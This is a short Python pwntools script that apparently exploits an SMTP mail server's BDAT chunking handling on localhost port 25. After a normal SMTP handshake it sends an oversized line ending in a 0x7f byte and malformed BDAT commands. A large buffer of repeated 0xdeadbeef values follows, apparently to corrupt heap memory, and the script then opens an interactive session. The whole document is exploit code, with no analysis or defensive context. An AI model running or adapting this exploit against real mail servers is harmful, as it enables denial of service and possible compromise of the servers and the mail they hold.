# pip install pwntools
from pwn import *

r = remote('127.0.0.1', 25)

r.recvline()
r.sendline("EHLO test")
r.recvuntil("250 HELP")
r.sendline("MAIL FROM:<test@localhost>")
r.recvline()
r.sendline("RCPT TO:<test@localhost>")
r.recvline()
r.sendline('a'*0x1250+'\x7f')
r.recvuntil('command')
r.sendline('BDAT 1')
r.sendline(':BDAT \x7f')
s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)
r.send(s+ ':\r\n')
r.recvuntil('command')
r.send('\n')
r.interactive()

